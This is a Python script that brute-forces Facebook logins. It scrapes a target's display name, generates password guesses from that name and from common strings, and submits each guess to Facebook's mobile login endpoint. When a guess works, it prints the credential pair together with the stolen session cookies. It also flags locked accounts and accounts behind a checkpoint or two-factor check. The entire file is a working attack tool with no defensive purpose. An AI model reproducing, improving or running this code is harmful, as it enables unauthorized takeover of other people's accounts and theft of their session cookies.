import re,requests,bs4,os
from bs4 import BeautifulSoup


os.system("clear")

class Brute:
	def __init__(self):
		self.ses = requests.Session()
		
	def main(self):
		id = input(" Enter ID : ")
		nama = self.get_nama(id)
		#if nama=="Login or Register to View":
		if nama=="Masuk atau Daftar untuk Melihat":
			print(" Failed to get a name, please fill it in yourself")
			nama = input(" Enter Name : ")
		self.login(id,Generate().password_list(nama))
		print(" Finished....")
		
	def get_nama(self,id):
		try:
			soup = BeautifulSoup(self.ses.get(f"https://www.facebook.com/{id}", headers={"user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"}).text,"html.parser")
			title = soup.find("meta",{"property":"og:title"})
			nama = title.get("content")
		except:
			#nama = "Login or Register to View"
			nama = "Masuk atau Daftar untuk Melihat"
		return nama
		
	def login(self,user,pwx):
		try:
			for pw in pwx:
				pw = pw.lower()
				get = self.ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&hbl=0&refsrc=deprecated")
				data = {"lsd": re.search('name="lsd" value="(.*?)"', str(get.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),"uid": user,"pass": pw,"flow": "login_no_pin","next": f"https://mbasic.facebook.com/login/save-device/?login_source=login"}
				post = self.ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data)
				if "c_user" in self.ses.cookies.get_dict():
					#if "Your Account is Locked" in post.text:
					if "Akun Anda Dikunci" in post.text:
						print(f" [Locked] {user}|{pw}")
					else:
						cookie = ";".join([key+"="+value for key,value in self.ses.cookies.get_dict().items()])
						print(f" [Successful] {user}|{pw}|{cookie}")
					break
				elif "checkpoint" in self.ses.cookies.get_dict():
					#if "Enter Login Code to Continue" in re.findall("\<title>(.*?)<\/title>",str(BeautifulSoup(post.text,"html.parser"))):
					if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(BeautifulSoup(post.text,"html.parser"))):
						print(f" [Two-Fector] {user}|{pw}")
					else:
						print(f" [Checkpoint] {user}|{pw}")
					break
				else:
					print(f" [Failed] {user}|{pw}")
		except:pass
		
class Generate:
	def password_list(self,nama):
		pwx = []
		for x in nama.split(" "):
			if len(x) < 6:
				pwx.append(x+"12")
				pwx.append(x+"123")
				pwx.append(x+"1234")
				pwx.append(x+"12345")
				pwx.append(x+"123456")
				pwx.append(x+"1122")
				pwx.append(x+"786")
				pwx.append(x+"@123")
				pwx.append(x+"@#")
				pwx.append(x+"2010")
				pwx.append(x+"2011")
				pwx.append(x+"2012")
				pwx.append(x+"2013")
				pwx.append(x+"2014")
				pwx.append(x+"2015")
				pwx.append(x+"2016")
				pwx.append(x+"2017")
				pwx.append(x+"2018")
				pwx.append(x+"2019")
				pwx.append(x+"2020")
				pwx.append(x+"2021")
				pwx.append(x+"2022")
				pwx.append(x+"2023")
				pwx.append(x+"2024")
				pwx.append(x+"@2010")
				pwx.append(x+"@2011")
				pwx.append(x+"@2012")
				pwx.append(x+"@2013")
				pwx.append(x+"@2014")
				pwx.append(x+"@2015")
				pwx.append(x+"@2016")
				pwx.append(x+"@2017")
				pwx.append(x+"@2018")
				pwx.append(x+"@2019")
				pwx.append(x+"@2020")
				pwx.append(x+"@2021")
				pwx.append(x+"@2022")
				pwx.append(x+"@2023")
				pwx.append(x+"@2024")
			else:
				pwx.append(x)
				pwx.append(x+"12")
				pwx.append(x+"123")
				pwx.append(x+"1234")
				pwx.append(x+"12345")
				pwx.append(x+"123456")
				pwx.append(x+"1122")
				pwx.append(x+"786")
				pwx.append(x+"@123")
				pwx.append(x+"@#")
				pwx.append(x+"2010")
				pwx.append(x+"2011")
				pwx.append(x+"2012")
				pwx.append(x+"2013")
				pwx.append(x+"2014")
				pwx.append(x+"2015")
				pwx.append(x+"2016")
				pwx.append(x+"2017")
				pwx.append(x+"2018")
				pwx.append(x+"2019")
				pwx.append(x+"2020")
				pwx.append(x+"2021")
				pwx.append(x+"2022")
				pwx.append(x+"2023")
				pwx.append(x+"2024")
				pwx.append(x+"@2010")
				pwx.append(x+"@2011")
				pwx.append(x+"@2012")
				pwx.append(x+"@2013")
				pwx.append(x+"@2014")
				pwx.append(x+"@2015")
				pwx.append(x+"@2016")
				pwx.append(x+"@2017")
				pwx.append(x+"@2018")
				pwx.append(x+"@2019")
				pwx.append(x+"@2020")
				pwx.append(x+"@2021")
				pwx.append(x+"@2022")
				pwx.append(x+"@2023")
				pwx.append(x+"@2024")
		pwx.append(nama)
		pwx.append(nama.replace(" ",""))
		pwx.append("Pakistan")
		pwx.append("pakistan")
		pwx.append("123456")
		pwx.append("I love you")
		pwx.append("i love you")
		pwx.append("janjan")
		pwx.append("Jan jan")
		pwx.append("pubg123")
		pwx.append("pubg king")
		pwx.append("free fire")
		pwx.append("freefire")
		pwx.append("khankhan")
		pwx.append("khan123")
		pwx.append("khan1234")
		pwx.append("khan12345")
		pwx.append("khan1122")
		pwx.append("khan786")
		pwx.append("123123")
		pwx.append("kumar123")
		pwx.append("57273200")
		pwx.append("59039200")
		
		return pwx
				
Brute().main()